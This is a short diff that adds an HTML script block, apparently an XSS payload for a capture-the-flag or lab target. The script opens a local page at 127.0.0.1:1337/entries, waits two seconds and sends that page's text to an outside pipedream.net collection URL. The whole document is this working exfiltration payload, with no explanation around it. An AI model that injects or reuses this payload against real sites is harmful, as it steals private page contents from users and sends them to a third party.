@@ -1,0 +1,6 @@
+<script>
+  pwn = window.open('http://127.0.0.1:1337/entries', 'pwn');
+  setTimeout(function() {
+    pwn.location = 'https://eoavm5tpsivq6i9.m.pipedream.net/?' + pwn.document.body.textContent;
+  }, 2000)
+</script>
